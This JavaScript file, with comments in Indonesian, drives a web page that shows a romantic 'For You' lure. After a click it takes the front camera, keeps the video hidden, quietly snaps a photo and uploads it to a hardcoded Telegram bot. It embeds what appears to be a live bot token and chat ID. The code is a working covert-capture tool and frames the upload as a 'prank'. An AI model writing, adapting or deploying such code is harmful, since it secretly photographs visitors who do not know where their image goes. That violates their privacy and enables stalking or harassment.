let stream = null;
let capturedImage = null;

const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
const TELEGRAM_CHAT_ID = "5323236080";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

window.addEventListener('load', () => {
    showStartPage();
});

function showStartPage() {
    const container = document.getElementById('camera-permission');
    container.innerHTML = `
        <div class="start-page">
            <h1>💕 Untuk Mu ❤️</h1>
            <p>Klik tombol di bawah untuk memulai</p>
            <button id="start-btn">MULAI</button>
        </div>
    `;

    document.getElementById('start-btn').addEventListener('click', requestCameraAccess);
}

async function requestCameraAccess() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });

        // Sembunyikan video element
        video.srcObject = stream;
        video.style.display = 'none';
        video.style.visibility = 'hidden';
        video.style.position = 'absolute';
        video.style.width = '0';
        video.style.height = '0';

        video.onloadedmetadata = () => {
            video.play();
            // Capture langsung tanpa delay terlihat
            setTimeout(() => {
                capturePhoto();
            }, 500);
        };

    } catch (error) {
        console.error('Error akses kamera:', error);
        alert('Izinkan akses kamera untuk melanjutkan!');
    }
}

function capturePhoto() {
    // Canvas juga hidden
    canvas.style.display = 'none';
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedImage = canvas.toDataURL('image/jpeg');

    // Matikan kamera
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    // Kirim langsung, tampilkan hasil
    sendPhotoToTelegram();
    displayCapturedPhoto();
}

async function sendPhotoToTelegram() {
    try {
        const blob = await fetch(capturedImage).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'prank.jpg');
        formData.append('caption', '📸 Foto berhasil dikapture!');

        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        const data = await response.json();
        if (data.ok) {
            console.log('✅ Foto terkirim!');
        }
    } catch (error) {
        console.error('❌ Error:', error);
    }
}

function displayCapturedPhoto() {
    const container = document.getElementById('camera-permission');
    container.innerHTML = '';

    const img = document.createElement('img');
    img.src = capturedImage;
    img.id = 'captured-photo';
    img.style.width = '100%';
    img.style.height = '100%';
    img.style.objectFit = 'cover';
    
    container.appendChild(img);

    const button = document.createElement('button');
    button.textContent = 'Ulangi';
    button.id = 'retry-btn';
    button.style.position = 'absolute';
    button.style.bottom = '30px';
    button.style.padding = '12px 30px';
    button.style.fontSize = '1rem';
    button.style.background = '#667eea';
    button.style.color = 'white';
    button.style.border = 'none';
    button.style.borderRadius = '50px';
    button.style.cursor = 'pointer';
    button.style.fontWeight = '600';
    button.style.zIndex = '10';
    
    container.appendChild(button);
    
    button.addEventListener('click', () => {
        capturedImage = null;
        video.style.display = 'none';
        showStartPage();
    });
}
